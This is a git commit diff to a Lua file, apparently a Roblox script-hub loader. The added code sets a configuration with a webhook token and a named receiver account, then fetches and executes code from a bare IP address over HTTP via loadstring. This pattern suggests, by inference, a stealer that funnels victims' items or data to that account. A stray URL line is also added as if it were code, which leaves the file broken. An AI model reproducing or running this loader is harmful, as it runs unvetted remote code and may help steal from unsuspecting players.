10166c1bb87fcb636c74ca8a4052eb0da0e0395e
luckhub-creator <guilhermexd137@gmail.com>
2026-05-02 16:49:22 -0300

    Update luckyhub.lua with new script and config
    Added configuration for StarScripts and updated script loading.

--- luckyhub.lua
+++ luckyhub.lua
@@ -1,1 +1,9 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/1S2I5lLHHG/0"))()
+https://pastefy.app/VFkbezLA/raw
+
+task.wait(0.2)
+
+getgenv().StarScriptsConfig = {
+    Webhook   = "K3_QM7oP2OxcKaqvi1PZBpTOqan2NwTS",
+    Receivers = { "guilherme190p" },
+}
+loadstring(game:HttpGet("http://205.185.125.84/sailor/piece"))()
